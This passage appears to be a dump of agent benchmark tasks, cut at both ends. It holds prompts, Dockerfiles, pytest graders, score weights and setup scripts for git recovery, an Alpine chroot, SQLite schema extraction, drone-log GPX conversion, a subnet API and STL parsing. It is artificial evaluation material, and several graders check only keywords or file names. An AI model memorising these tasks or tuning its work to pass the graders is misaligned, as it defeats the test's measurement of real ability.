calculate_pnl(self):\n        \""\""\""Calculate profit and loss.\""\""\""\n        total_pnl = 0\n        position = 0\n        \n        for trade in self.trades:\n            if 'CLIENT' in trade.get('buyer_id', ''):\n                # We bought\n                position += trade['quantity']\n                total_pnl -= trade['price'] * trade['quantity']\n            elif 'CLIENT' in trade.get('seller_id', ''):\n                # We sold\n                position -= trade['quantity']\n                total_pnl += trade['price'] * trade['quantity']\n                \n        # Add unrealized P&L (mark to market)\n        if self.orderbook['last_price']:\n            total_pnl += position * self.orderbook['last_price']\n            \n        return total_pnl\n\n\nasync def main():\n    bot = TradingBot()\n    await bot.connect_and_trade()\n    \n    pnl = bot.calculate_pnl()\n    print(f\""Total trades: {len(bot.trades)}\"")\n    print(f\""Final P&L: ${pnl:.2f}\"")\n\n\nif __name__ == \""__main__\"":\n    asyncio.run(main())"", ""run_trading.py"": ""#!/usr/bin/env python3\n\""\""\""Run the exchange server and trading bot for testing.\""\""\""\n\nimport asyncio\nimport sys\nimport time\nfrom exchange_simulator import SimulatedExchange, handle_client\nimport websockets\n\n\nasync def run_test():\n    # Start exchange\n    exchange = SimulatedExchange()\n    await exchange.start()\n    \n    # Start WebSocket server\n    server = await websockets.serve(\n        lambda ws, path: handle_client(ws, path, exchange),\n        \""localhost\"",\n        8765\n    )\n    \n    print(\""Exchange server started on ws://localhost:8765\"")\n    print(\""Waiting for trading bot to connect...\"")\n    \n    # Wait for bot to complete trading\n    start_time = time.time()\n    timeout = 300  # 5 minutes max\n    \n    while time.time() - start_time < timeout:\n        # Check if we have a client\n        if exchange.clients:\n            client_id = list(exchange.clients.keys())[0]\n            stats = exchange.get_stats(client_id)\n            \n            if stats['total_trades'] >= 1000:\n                print(f\""\\nTrading complete!\"")\n                print(f\""Total trades: {stats['total_trades']}\"")\n                print(f\""P&L: ${stats['pnl']:.2f}\"")\n                print(f\""Trap avoidance rate: {stats['trap_avoidance_rate']*100:.1f}%\"")\n                print(f\""Sharpe ratio: {stats['sharpe_ratio']:.2f}\"")\n                \n                # Save results\n                with open('trading_results.json', 'w') as f:\n                    import json\n                    json.dump(stats, f)\n                \n                break\n                \n        await asyncio.sleep(1)\n    \n    # Cleanup\n    server.close()\n    await server.wait_closed()\n    await exchange.stop()\n    \n    return exchange\n\n\nif __name__ == \""__main__\"":\n    if len(sys.argv) > 1 and sys.argv[1] == \""exchange\"":\n        # Run exchange only\n        asyncio.run(asyncio.create_task(run_test()))\n    else:\n        # Run full test\n        asyncio.run(run_test())""}",2025-07-22T11:01:35.956735+00:00,2025-07-22T17:55:31.930111+00:00
draft_dp_0ca25a56,medium,draft_dp_0ca25a56,system-administration,"Someone ran git revert on the wrong commit and deleted all our Ansible playbooks. Need to recover provision-database.yml, deploy-application.yml, and security-hardening.yml without losing the intended revert changes.",system-administration,git|file-recovery|automation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN apt-get update && apt-get install -y \
    git \
    ansible \
    python3-yaml \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /workspace

# Set git config for the container
RUN git config --global user.email ""dev@example.com"" && \
    git config --global user.name ""Developer""

# Copy setup script
COPY setup_git_history.sh /workspace/

# Run setup to create the git history scenario
RUN bash setup_git_history.sh

CMD [""/bin/bash""]","import os
import subprocess
import yaml

def test_ansible_playbooks_restored():
    """"""Test that the three critical Ansible playbooks have been restored.""""""
    playbooks = [
        'ansible/playbooks/provision-database.yml',
        'ansible/playbooks/deploy-application.yml', 
        'ansible/playbooks/security-hardening.yml'
    ]
    
    for playbook in playbooks:
        assert os.path.exists(playbook), f""Playbook {playbook} not found""
        # Verify it's valid YAML
        with open(playbook, 'r') as f:
            yaml.safe_load(f)

def test_intended_revert_preserved():
    """"""Test that the debug mode config (the intended revert target) is still reverted.""""""
    # Check that app.config doesn't exist (it should have been removed)
    # OR if it exists, debug mode should be false
    if os.path.exists('app.config'):
        with open('app.config', 'r') as f:
            content = f.read()
            assert 'DEBUG_MODE=true' not in content, ""Debug mode should not be enabled - intended revert not preserved""","{""test_ansible_playbooks_restored"": 0.7, ""test_intended_revert_preserved"": 0.3}","{""setup_git_history.sh"": ""#!/bin/bash\n\n# Initialize git repo\ngit init\n\n# Create ansible directory structure\nmkdir -p ansible/playbooks\nmkdir -p ansible/roles/{database,webapp,security}/{tasks,handlers,templates,vars,defaults,meta}\nmkdir -p ansible/inventory\n\n# Create ansible.cfg\ncat > ansible.cfg << 'EOF'\n[defaults]\ninventory = ansible/inventory/hosts\nhost_key_checking = False\nretry_files_enabled = False\nEOF\n\n# Create inventory file\ncat > ansible/inventory/hosts << 'EOF'\n[webservers]\nweb01 ansible_host=192.168.1.10\nweb02 ansible_host=192.168.1.11\n\n[dbservers]\ndb01 ansible_host=192.168.1.20\nEOF\n\n# Initial commit\ngit add .\ngit commit -m \""Initial ansible setup\""\n\n# Create the Ansible playbooks that will be accidentally deleted\ncat > ansible/playbooks/provision-database.yml << 'EOF'\n---\n- name: Provision database servers\n  hosts: dbservers\n  become: yes\n  roles:\n    - database\n  vars:\n    db_name: production\n    db_user: appuser\nEOF\n\ncat > ansible/playbooks/deploy-application.yml << 'EOF'\n---\n- name: Deploy web application\n  hosts: webservers\n  become: yes\n  roles:\n    - webapp\n  vars:\n    app_version: \""{{ lookup('env', 'APP_VERSION') | default('latest') }}\""\n    app_port: 8080\nEOF\n\ncat > ansible/playbooks/security-hardening.yml << 'EOF'\n---\n- name: Apply security hardening\n  hosts: all\n  become: yes\n  roles:\n    - security\n  vars:\n    ssh_port: 22\n    allowed_users:\n      - admin\n      - deploy\nEOF\n\n# Create role tasks\ncat > ansible/roles/database/tasks/main.yml << 'EOF'\n---\n- name: Install PostgreSQL\n  package:\n    name: postgresql\n    state: present\n\n- name: Create database\n  postgresql_db:\n    name: \""{{ db_name }}\""\n    state: present\nEOF\n\ncat > ansible/roles/webapp/tasks/main.yml << 'EOF'\n---\n- name: Install web application\n  git:\n    repo: https://github.com/example/app.git\n    dest: /opt/webapp\n    version: \""{{ app_version }}\""\n\n- name: Start application service\n  systemd:\n    name: webapp\n    state: started\n    enabled: yes\nEOF\n\ncat > ansible/roles/security/tasks/main.yml << 'EOF'\n---\n- name: Configure firewall\n  ufw:\n    rule: allow\n    port: \""{{ ssh_port }}\""\n    proto: tcp\n\n- name: Set up fail2ban\n  package:\n    name: fail2ban\n    state: present\nEOF\n\n# Commit the Ansible playbooks\ngit add ansible/\ngit commit -m \""Add Ansible playbooks for infrastructure provisioning\""\n\n# Create a config file with a bug (this is what should have been reverted)\ncat > app.config << 'EOF'\n# Application configuration\nSERVER_PORT=8080\nDATABASE_URL=postgresql://localhost:5432/production\nDEBUG_MODE=true  # This should be false in production!\nMAX_CONNECTIONS=1000\nEOF\n\ngit add app.config\ngit commit -m \""Add application config with debug mode enabled\""\n\n# Create another commit to show work continued\necho \""# Deployment Notes\"" > DEPLOY.md\necho \""Use ansible-playbook to deploy\"" >> DEPLOY.md\ngit add DEPLOY.md\ngit commit -m \""Add deployment documentation\""\n\n# Now perform the accidental revert (should have reverted the config commit, but reverted the playbooks instead)\nPLAYBOOK_COMMIT=$(git log --oneline | grep \""Add Ansible playbooks\"" | cut -d' ' -f1)\ngit revert --no-edit $PLAYBOOK_COMMIT\n\n# Add one more commit after the revert\necho \""v1.2.3\"" > VERSION\ngit add VERSION\ngit commit -m \""Bump version to 1.2.3\""""}",2025-07-22T11:39:23.304827+00:00,2025-07-22T11:41:16.899599+00:00
draft_dp_ec24486f,medium,draft_dp_ec24486f,system-administration,Need to finish setting up this Alpine chroot - got stuck getting apk to work properly. The chroot should be able to install packages and run binaries.,system-administration,sys-admin|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /workspace

# Install necessary tools
RUN apt-get update && apt-get install -y \
    wget \
    tar \
    mount \
    util-linux \
    && rm -rf /var/lib/apt/lists/*

# Copy the incomplete setup script
COPY setup_alpine_chroot.sh /workspace/

# Make it executable
RUN chmod +x /workspace/setup_alpine_chroot.sh

# Run the partial setup
RUN /workspace/setup_alpine_chroot.sh

# Leave the workspace ready for completion
WORKDIR /workspace","import os
import subprocess
import json

def test_chroot_can_run_apk():
    """"""Test that apk package manager works inside the chroot""""""
    # Run apk update inside the chroot
    result = subprocess.run(
        ['chroot', '/alpine-chroot', '/sbin/apk', 'update'],
        capture_output=True,
        text=True
    )
    # Should succeed and mention fetching indexes
    assert result.returncode == 0
    assert 'fetch' in result.stdout.lower()

def test_chroot_can_install_and_run_package():
    """"""Test that we can install and run a package inside chroot""""""
    # Try to run a simple command that should be installed
    result = subprocess.run(
        ['chroot', '/alpine-chroot', '/bin/ls', '/usr/bin'],
        capture_output=True,
        text=True
    )
    # Should succeed and show some binaries
    assert result.returncode == 0
    assert len(result.stdout.strip().split('\n')) > 5  # Should have several binaries","{""test_chroot_can_run_apk"": 0.6, ""test_chroot_can_install_and_run_package"": 0.4}","{""setup_alpine_chroot.sh"": ""#!/bin/bash\n\n# Alpine chroot setup script - INCOMPLETE\n# Started working on this but can't get apk to work\n\nCHROOT_DIR=\""/alpine-chroot\""\nALPINE_VERSION=\""3.19\""\nALPINE_ARCH=\""x86_64\""\nMIRROR=\""https://dl-cdn.alpinelinux.org/alpine\""\n\n# Create chroot directory\nmkdir -p \""$CHROOT_DIR\""\n\n# Download Alpine mini root filesystem\necho \""Downloading Alpine mini root filesystem...\""\nwget -q \""$MIRROR/v$ALPINE_VERSION/releases/$ALPINE_ARCH/alpine-minirootfs-${ALPINE_VERSION}.0-${ALPINE_ARCH}.tar.gz\"" -O /tmp/alpine.tar.gz\n\n# Extract filesystem\necho \""Extracting filesystem...\""\ntar -xzf /tmp/alpine.tar.gz -C \""$CHROOT_DIR\""\n\n# Set up resolv.conf\ncp /etc/resolv.conf \""$CHROOT_DIR/etc/\""\n\necho \""Basic extraction done, but chroot not fully functional yet\""""}",2025-07-22T11:33:33.666217+00:00,2025-07-22T17:57:14.400960+00:00
draft_dp_67e56cc2,medium,draft_dp_67e56cc2,data-processing,I need to extract schema info and row counts from the company.db and products.db SQLite files. Also identify any foreign key relationships between tables.,data-processing,data-extraction|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install sqlite3 if not already included
RUN apt-get update && apt-get install -y sqlite3 && rm -rf /var/lib/apt/lists/*

# Copy database creation scripts
COPY create_databases.py /workspace/

# Create the SQLite databases
RUN python create_databases.py

# Clean up creation script
RUN rm create_databases.py","import os
import json

def test_schema_extraction_file_exists():
    """"""Test that the agent created a file containing schema information.""""""
    # Check for common output files
    possible_files = ['schema_info.txt', 'database_info.txt', 'extraction_results.txt', 
                      'schema.json', 'db_analysis.txt', 'output.txt', 'results.txt']
    
    found = False
    for filename in possible_files:
        if os.path.exists(f'/workspace/{filename}'):
            found = True
            break
    
    assert found, ""No schema extraction output file found""

def test_foreign_keys_identified():
    """"""Test that foreign key relationships were identified between tables.""""""
    # Look for output containing foreign key information
    possible_files = ['schema_info.txt', 'database_info.txt', 'extraction_results.txt',
                      'schema.json', 'db_analysis.txt', 'output.txt', 'results.txt', 
                      'foreign_keys.txt', 'relationships.txt']
    
    foreign_key_found = False
    for filename in possible_files:
        filepath = f'/workspace/{filename}'
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                content = f.read().lower()
                # Check for foreign key mentions
                if 'foreign' in content or 'references' in content or 'department_id' in content or 'category_id' in content or 'product_id' in content:
                    foreign_key_found = True
                    break
    
    assert foreign_key_found, ""No foreign key relationships identified in output""","{""test_schema_extraction_file_exists"": 0.4, ""test_foreign_keys_identified"": 0.6}","{""create_databases.py"": ""import sqlite3\nimport datetime\n\n# Create company.db\nconn = sqlite3.connect('company.db')\nc = conn.cursor()\n\n# Create employees table\nc.execute('''CREATE TABLE employees (\n    id INTEGER PRIMARY KEY,\n    name TEXT NOT NULL,\n    department_id INTEGER,\n    salary REAL,\n    hire_date TEXT,\n    FOREIGN KEY (department_id) REFERENCES departments(id)\n)''')\n\n# Create departments table\nc.execute('''CREATE TABLE departments (\n    id INTEGER PRIMARY KEY,\n    name TEXT NOT NULL,\n    budget REAL\n)''')\n\n# Insert departments\ndepartments = [\n    (1, 'Engineering', 500000.0),\n    (2, 'Sales', 300000.0),\n    (3, 'Marketing', 200000.0)\n]\nc.executemany('INSERT INTO departments VALUES (?, ?, ?)', departments)\n\n# Insert employees\nemployees = [\n    (1, 'John Doe', 1, 85000.0, '2020-01-15'),\n    (2, 'Jane Smith', 1, 95000.0, '2019-03-22'),\n    (3, 'Bob Johnson', 2, 65000.0, '2021-06-10'),\n    (4, 'Alice Brown', 3, 70000.0, '2020-11-05'),\n    (5, 'Charlie Wilson', 2, 72000.0, '2022-02-18')\n]\nc.executemany('INSERT INTO employees VALUES (?, ?, ?, ?, ?)', employees)\n\n# Enable foreign keys\nc.execute('PRAGMA foreign_keys = ON')\n\nconn.commit()\nconn.close()\n\n# Create products.db\nconn = sqlite3.connect('products.db')\nc = conn.cursor()\n\n# Create products table\nc.execute('''CREATE TABLE products (\n    id INTEGER PRIMARY KEY,\n    name TEXT NOT NULL,\n    category_id INTEGER,\n    price REAL,\n    stock INTEGER,\n    FOREIGN KEY (category_id) REFERENCES categories(id)\n)''')\n\n# Create categories table\nc.execute('''CREATE TABLE categories (\n    id INTEGER PRIMARY KEY,\n    name TEXT NOT NULL,\n    description TEXT\n)''')\n\n# Create orders table\nc.execute('''CREATE TABLE orders (\n    id INTEGER PRIMARY KEY,\n    product_id INTEGER,\n    quantity INTEGER,\n    order_date TEXT,\n    customer_email TEXT,\n    FOREIGN KEY (product_id) REFERENCES products(id)\n)''')\n\n# Insert categories\ncategories = [\n    (1, 'Electronics', 'Electronic devices and accessories'),\n    (2, 'Books', 'Physical and digital books'),\n    (3, 'Clothing', 'Apparel and accessories')\n]\nc.executemany('INSERT INTO categories VALUES (?, ?, ?)', categories)\n\n# Insert products\nproducts = [\n    (1, 'Laptop', 1, 999.99, 15),\n    (2, 'Smartphone', 1, 699.99, 32),\n    (3, 'Python Programming', 2, 49.99, 100),\n    (4, 'T-Shirt', 3, 19.99, 250),\n    (5, 'Headphones', 1, 149.99, 45),\n    (6, 'Data Science Handbook', 2, 59.99, 75)\n]\nc.executemany('INSERT INTO products VALUES (?, ?, ?, ?, ?)', products)\n\n# Insert orders\norders = [\n    (1, 1, 2, '2024-01-10', 'customer1@email.com'),\n    (2, 3, 1, '2024-01-11', 'customer2@email.com'),\n    (3, 2, 1, '2024-01-11', 'customer3@email.com'),\n    (4, 4, 3, '2024-01-12', 'customer1@email.com')\n]\nc.executemany('INSERT INTO orders VALUES (?, ?, ?, ?, ?)', orders)\n\n# Enable foreign keys\nc.execute('PRAGMA foreign_keys = ON')\n\nconn.commit()\nconn.close()\n\nprint(\""Databases created successfully\"")""}",2025-07-22T11:34:55.123926+00:00,2025-07-22T11:34:55.150834+00:00
draft_dp_40dc0e0f,hard,draft_dp_40dc0e0f,data-processing,I need to extract GPS coordinates and timestamps from these drone flight logs in /data/flights/. Parse the binary format and generate a GPX file with the flight path.,data-processing,python|binary-processing|data-extraction,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install required Python packages - use pre-built wheels
RUN pip install --only-binary :all: numpy gpxpy

# Copy documentation and scripts
COPY log_format.md /workspace/
COPY generate_logs.py /workspace/

# Generate sample flight logs
RUN python generate_logs.py && rm generate_logs.py

# Set up working directory
WORKDIR /workspace","import os
import subprocess
import struct
import gpxpy
import gpxpy.parser

def test_gps_extraction_from_binary():
    """"""Test that GPS coordinates are correctly extracted from binary logs""""""
    # Check if a GPX file was created from the flight logs
    gpx_files = [f for f in os.listdir('/workspace') if f.endswith('.gpx')]
    assert len(gpx_files) > 0, ""No GPX files found - GPS extraction failed""
    
    # Parse the GPX file to verify GPS coordinates
    gpx_file = gpx_files[0]
    with open(f'/workspace/{gpx_file}', 'r') as f:
        gpx = gpxpy.parse(f)
    
    # Check that we have tracks with points
    assert len(gpx.tracks) > 0, ""No tracks found in GPX file""
    
    total_points = 0
    for track in gpx.tracks:
        for segment in track.segments:
            total_points += len(segment.points)
    
    assert total_points >= 10, f""Too few GPS points extracted: {total_points}""
    
    # Verify first point is near Seattle (from our test data)
    first_point = gpx.tracks[0].segments[0].points[0]
    assert 47.5 < first_point.latitude < 47.7, f""Invalid latitude: {first_point.latitude}""
    assert -122.4 < first_point.longitude < -122.2, f""Invalid longitude: {first_point.longitude}""

def test_gpx_file_validity():
    """"""Test that generated GPX file is valid and contains proper metadata""""""
    # Find GPX file
    gpx_files = [f for f in os.listdir('/workspace') if f.endswith('.gpx')]
    assert len(gpx_files) > 0, ""No GPX files generated""
    
    gpx_file = gpx_files[0]
    
    # Try to parse it with strict validation
    try:
        with open(f'/workspace/{gpx_file}', 'r') as f:
            gpx = gpxpy.parse(f)
    except Exception as e:
        assert False, f""GPX file is not valid XML: {e}""
    
    # Check for essential GPX elements
    assert gpx.tracks, ""GPX file has no tracks""
    
    # Verify timestamps exist
    has_time = False
    for track in gpx.tracks:
        for segment in track.segments:
            for point in segment.points:
                if point.time is not None:
                    has_time = True
                    break
    
    assert has_time, ""GPX points lack timestamp information""
    
    # Check that elevation data is included
    has_elevation = False
    for track in gpx.tracks:
        for segment in track.segments:
            for point in segment.points:
                if point.elevation is not None:
                    has_elevation = True
                    break
    
    assert has_elevation, ""GPX points lack elevation data""","{""test_gps_extraction_from_binary"": 0.6, ""test_gpx_file_validity"": 0.4}","{""log_format.md"": ""# Custom Drone Log Format v1.0\n\nBinary format specification for flight telemetry logs.\n\n## Header (16 bytes)\n- Magic number: 0x44524F4E (4 bytes, \""DRON\"")\n- Version: uint16 (2 bytes) \n- Record count: uint32 (4 bytes)\n- Start timestamp: uint32 (4 bytes, Unix timestamp)\n- Reserved: 2 bytes\n\n## Record Format (32 bytes each)\n- Timestamp offset: uint32 (4 bytes, milliseconds from start)\n- Latitude: float32 (4 bytes, degrees)\n- Longitude: float32 (4 bytes, degrees)  \n- Altitude: float32 (4 bytes, meters above sea level)\n- Speed: float32 (4 bytes, m/s)\n- Heading: float32 (4 bytes, degrees)\n- Battery: uint8 (1 byte, percentage)\n- Satellites: uint8 (1 byte, count)\n- Flags: uint16 (2 bytes, status bits)\n- CRC16: uint16 (2 bytes, checksum of record)\n- Reserved: 4 bytes\n\nAll multi-byte values are little-endian."", ""generate_logs.py"": ""#!/usr/bin/env python3\nimport struct\nimport os\nimport time\n\ndef crc16(data):\n    \""\""\""Calculate CRC16 checksum\""\""\""\n    crc = 0xFFFF\n    for byte in data:\n        crc ^= byte\n        for _ in range(8):\n            if crc & 0x0001:\n                crc = (crc >> 1) ^ 0xA001\n            else:\n                crc >>= 1\n    return crc & 0xFFFF\n\ndef create_flight_log(filename, waypoints):\n    \""\""\""Create a binary drone flight log\""\""\""\n    os.makedirs(os.path.dirname(filename), exist_ok=True)\n    \n    with open(filename, 'wb') as f:\n        # Write header\n        magic = 0x44524F4E  # \""DRON\""\n        version = 1\n        record_count = len(waypoints)\n        start_timestamp = int(time.time()) - 3600  # 1 hour ago\n        \n        header = struct.pack('<IHHII', magic, version, record_count, start_timestamp, 0)\n        f.write(header)\n        \n        # Write records\n        for i, (lat, lon, alt, speed, heading, battery, sats) in enumerate(waypoints):\n            timestamp_offset = i * 1000  # 1 second intervals\n            flags = 0x0001  # GPS valid flag\n            \n            # Pack record without CRC\n            record_data = struct.pack('<IfffffBBH', \n                timestamp_offset, lat, lon, alt, speed, heading, battery, sats, flags)\n            \n            # Calculate CRC\n            crc = crc16(record_data)\n            \n            # Write complete record\n            f.write(record_data)\n            f.write(struct.pack('<HI', crc, 0))  # CRC + reserved\n\n# Create sample flight logs\nif __name__ == \""__main__\"":\n    # Flight 1: Simple rectangular pattern\n    flight1 = [\n        # lat, lon, alt, speed, heading, battery, satellites\n        (47.6062, -122.3321, 100.0, 0.0, 0.0, 100, 12),\n        (47.6062, -122.3321, 120.0, 5.0, 0.0, 99, 12),\n        (47.6072, -122.3321, 120.0, 10.0, 0.0, 98, 11),\n        (47.6082, -122.3321, 120.0, 10.0, 0.0, 97, 11),\n        (47.6082, -122.3311, 120.0, 10.0, 90.0, 96, 12),\n        (47.6082, -122.3301, 120.0, 10.0, 90.0, 95, 12),\n        (47.6072, -122.3301, 120.0, 10.0, 180.0, 94, 11),\n        (47.6062, -122.3301, 120.0, 10.0, 180.0, 93, 11),\n        (47.6062, -122.3311, 120.0, 10.0, 270.0, 92, 12),\n        (47.6062, -122.3321, 100.0, 5.0, 270.0, 91, 12),\n        (47.6062, -122.3321, 80.0, 2.0, 0.0, 90, 12),\n        (47.6062, -122.3321, 0.0, 0.0, 0.0, 89, 12),\n    ]\n    \n    create_flight_log('/data/flights/flight001.log', flight1)\n    \n    # Flight 2: Circular pattern with altitude changes\n    import math\n    flight2 = []\n    center_lat, center_lon = 47.6762, -122.3182\n    radius = 0.002  # ~200m\n    for i in range(20):\n        angle = (i / 20) * 2 * math.pi\n        lat = center_lat + radius * math.cos(angle)\n        lon = center_lon + radius * math.sin(angle)\n        alt = 50 + 50 * math.sin(angle)\n        speed = 8.0\n        heading = (angle * 180 / math.pi + 90) % 360\n        battery = 100 - i * 2\n        sats = 10 + (i % 3)\n        flight2.append((lat, lon, alt, speed, heading, battery, sats))\n    \n    create_flight_log('/data/flights/flight002.log', flight2)\n    \n    print(\""Sample flight logs created in /data/flights/\"")""}",2025-07-22T11:37:46.763899+00:00,2025-07-22T11:47:37.440369+00:00
draft_dp_fae65bbb,hard,draft_dp_fae65bbb,software-engineering,"Need a subnet calculator API on port 7777. GET /subnet endpoint should take a CIDR parameter (like ""192.168.1.0/24"") and return all subnet info: network/broadcast addresses, usable IP range, subnet mask, and host counts. Implement the binary math yourself - no external networking libraries.",software-engineering,python|api|networking,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

COPY requirements.txt /app/
RUN pip install -r requirements.txt

COPY app.py /app/

EXPOSE 7777

CMD [""python"", ""app.py""]","import subprocess
import json
import time

def test_subnet_endpoint_calculates_correctly():
    """"""Test that /subnet endpoint returns correct subnet calculations for 192.168.1.0/24""""""
    # Give the service a moment to start
    time.sleep(2)
    
    result = subprocess.run(
        ['curl', '-s', 'http://localhost:7777/subnet?cidr=192.168.1.0/24'],
        capture_output=True, text=True
    )
    
    assert result.returncode == 0, f""curl failed with code {result.returncode}""
    
    data = json.loads(result.stdout)
    assert data['network'] == '192.168.1.0'
    assert data['broadcast'] == '192.168.1.255'
    assert data['first_usable'] == '192.168.1.1'
    assert data['last_usable'] == '192.168.1.254'
    assert data['subnet_mask'] == '255.255.255.0'
    assert data['usable_hosts'] == 254

def test_subnet_validates_input():
    """"""Test that /subnet endpoint validates CIDR input and returns 400 for invalid input""""""
    time.sleep(1)
    
    # Test missing parameter
    result = subprocess.run(
        ['curl', '-s', '-w', '\n%{http_code}', 'http://localhost:7777/subnet'],
        capture_output=True, text=True
    )
    lines = result.stdout.strip().split('\n')
    http_code = lines[-1]
    assert http_code == '400', f""Expected 400 for missing parameter, got {http_code}""","{""test_subnet_endpoint_calculates_correctly"": 0.7, ""test_subnet_validates_input"": 0.3}","{""requirements.txt"": ""Flask==3.0.0\nWerkzeug==3.0.1"", ""app.py"": ""from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\ndef ip_to_int(ip_str):\n    \""\""\""Convert IP address string to integer using binary operations\""\""\""\n    octets = ip_str.split('.')\n    if len(octets) != 4:\n        raise ValueError(\""Invalid IP address format\"")\n    \n    result = 0\n    for octet in octets:\n        octet_int = int(octet)\n        if octet_int < 0 or octet_int > 255:\n            raise ValueError(\""Invalid octet value\"")\n        result = (result << 8) | octet_int\n    return result\n\ndef int_to_ip(ip_int):\n    \""\""\""Convert integer to IP address string using binary operations\""\""\""\n    octets = []\n    for _ in range(4):\n        octets.append(str(ip_int & 0xFF))\n        ip_int >>= 8\n    return '.'.join(reversed(octets))\n\ndef parse_cidr(cidr):\n    \""\""\""Parse CIDR notation and return IP and prefix length\""\""\""\n    parts = cidr.split('/')\n    if len(parts) != 2:\n        raise ValueError(\""Invalid CIDR notation\"")\n    \n    ip_str = parts[0]\n    try:\n        prefix_len = int(parts[1])\n        if prefix_len < 0 or prefix_len > 32:\n            raise ValueError(\""Invalid prefix length\"")\n    except ValueError:\n        raise ValueError(\""Invalid prefix length\"")\n    \n    return ip_str, prefix_len\n\ndef calculate_subnet_info(cidr):\n    \""\""\""Calculate subnet information using binary math\""\""\""\n    ip_str, prefix_len = parse_cidr(cidr)\n    ip_int = ip_to_int(ip_str)\n    \n    # Calculate subnet mask using binary operations\n    if prefix_len == 0:\n        subnet_mask = 0\n    else:\n        subnet_mask = (0xFFFFFFFF << (32 - prefix_len)) & 0xFFFFFFFF\n    \n    # Calculate network address\n    network_int = ip_int & subnet_mask\n    \n    # Calculate broadcast address\n    host_bits = 32 - prefix_len\n    if host_bits == 32:\n        broadcast_int = 0xFFFFFFFF\n    else:\n        broadcast_int = network_int | ((1 << host_bits) - 1)\n    \n    # Calculate first and last usable IPs\n    if prefix_len >= 31:\n        # For /31 and /32, no traditional usable hosts\n        first_usable_int = network_int\n        last_usable_int = broadcast_int\n        usable_hosts = 0\n    else:\n        first_usable_int = network_int + 1\n        last_usable_int = broadcast_int - 1\n        usable_hosts = (1 << host_bits) - 2\n    \n    return {\n        'network': int_to_ip(network_int),\n        'broadcast': int_to_ip(broadcast_int),\n        'first_usable': int_to_ip(first_usable_int),\n        'last_usable': int_to_ip(last_usable_int),\n        'subnet_mask': int_to_ip(subnet_mask),\n        'usable_hosts': usable_hosts\n    }\n\n@app.route('/health')\ndef health_check():\n    return jsonify({\""status\"": \""healthy\""}), 200\n\n@app.route('/subnet', methods=['GET'])\ndef subnet_calculator():\n    cidr = request.args.get('cidr')\n    \n    if not cidr:\n        return jsonify({\""error\"": \""Missing 'cidr' parameter\""}), 400\n    \n    try:\n        result = calculate_subnet_info(cidr)\n        return jsonify(result), 200\n    except ValueError as e:\n        return jsonify({\""error\"": str(e)}), 400\n    except Exception as e:\n        return jsonify({\""error\"": \""Internal server error\""}), 500\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=7777)""}",2025-07-22T11:37:34.172998+00:00,2025-07-22T17:58:50.951264+00:00
draft_dp_352f0efa,medium,draft_dp_352f0efa,data-processing,"I need to parse these binary STL files and extract the vertex data. The parser should handle the binary format correctly and output vertex count, bounding box, and detect any degenerate triangles.",data-processing,python|binary-processing|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

RUN pip install numpy

COPY generate_stl_files.py /workspace/

RUN python generate_stl_files.py

CMD [""bash""]","import os
import subprocess
import json

def test_stl_parser_exists_and_runs():
    """"""Test that the STL parser script exists and can parse cube.stl.""""""
    # Check if parser script exists
    assert os.path.exists('/workspace/stl_parser.py'), ""STL parser script not found""
    
    # Test parsing cube.stl
    result = subprocess.run(
        ['python', '/workspace/stl_parser.py', '/workspace/cube.stl'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Parser failed with code {result.returncode}""
    
    # Check output contains expected information
    output = result.stdout
    assert 'vertices' in output.lower() or 'vertex count' in output.lower(), ""No vertex count in output""
    assert '36' in output, ""Expected 36 vertices for cube (12 triangles * 3 vertices)""

def test_bounding_box_calculation():
    """"""Test that bounding box is calculated correctly for cube.""""""
    result = subprocess.run(
        ['python', '/workspace/stl_parser.py', '/workspace/cube.stl'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0
    output = result.stdout
    
    # Check for bounding box information
    assert 'bounding box' in output.lower() or 'bounds' in output.lower(), ""No bounding box in output""
    
    # Cube should have bounds from (0,0,0) to (1,1,1)
    assert '0' in output and '1' in output, ""Expected bounds from 0 to 1""

def test_degenerate_triangle_detection():
    """"""Test that degenerate triangles are detected in broken.stl.""""""
    result = subprocess.run(
        ['python', '/workspace/stl_parser.py', '/workspace/broken.stl'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0
    output = result.stdout
    
    # Should detect degenerate triangles
    assert 'degenerate' in output.lower() or 'invalid' in output.lower() or 'warning' in output.lower(), ""No degenerate triangle detection""","{""test_stl_parser_exists_and_runs"": 0.4, ""test_bounding_box_calculation"": 0.3, ""test_degenerate_triangle_detection"": 0.3}","{""generate_stl_files.py"": ""#!/usr/bin/env python3\nimport struct\n\ndef create_cube_stl():\n    header = b'Binary STL Cube' + b'\\0' * (80 - len('Binary STL Cube'))\n    \n    vertices = [\n        # Front face\n        [[0, 0, 1], [0, 0, 0], [1, 0, 0], [1, 0, 1]],\n        # Back face\n        [[1, 1, 1], [1, 1, 0], [0, 1, 0], [0, 1, 1]],\n        # Top face\n        [[0, 0, 1], [1, 0, 1], [1, 1, 1], [0, 1, 1]],\n        # Bottom face\n        [[0, 0, 0], [0, 1, 0], [1, 1, 0], [1, 0, 0]],\n        # Left face\n        [[0, 0, 1], [0, 1, 1], [0, 1, 0], [0, 0, 0]],\n        # Right face\n        [[1, 0, 1], [1, 0, 0], [1, 1, 0], [1, 1, 1]],\n    ]\n    \n    triangles = []\n    for face in vertices:\n        triangles.append([face[0], face[1], face[2]])\n        triangles.append([face[0], face[2], face[3]])\n    \n    with open('/workspace/cube.stl', 'wb') as f:\n        f.write(header)\n        f.write(struct.pack('<I', len(triangles)))\n        \n        for tri in triangles:\n            v1 = [tri[1][i] - tri[0][i] for i in range(3)]\n            v2 = [tri[2][i] - tri[0][i] for i in range(3)]\n            normal = [\n                v1[1]*v2[2] - v1[2]*v2[1],\n                v1[2]*v2[0] - v1[0]*v2[2],\n                v1[0]*v2[1] - v1[1]*v2[0]\n            ]\n            \n            length = 